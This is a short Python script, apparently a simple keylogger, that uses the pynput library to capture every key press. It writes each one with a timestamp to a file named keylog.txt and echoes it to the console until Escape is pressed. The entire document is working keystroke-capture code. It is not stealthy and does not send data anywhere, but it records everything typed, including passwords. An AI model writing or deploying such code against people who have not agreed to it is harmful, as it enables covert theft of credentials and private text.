from pynput import keyboard
import logging
import sys



def on_press(key):
    try:
         # Stop the application if the user press escape
        if key == keyboard.Key.esc:
            sys.exit()

        print('Alphanumeric key {0} pressed'.format(key.char))
        logging.info(str(key))

    except AttributeError:
        print('Special key {0} pressed'.format(key))
        logging.info(str(key))



if __name__ == "__main__":
    
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    
    # Collect events until released
    with keyboard.Listener(on_press=on_press) as listener :
        listener.join()
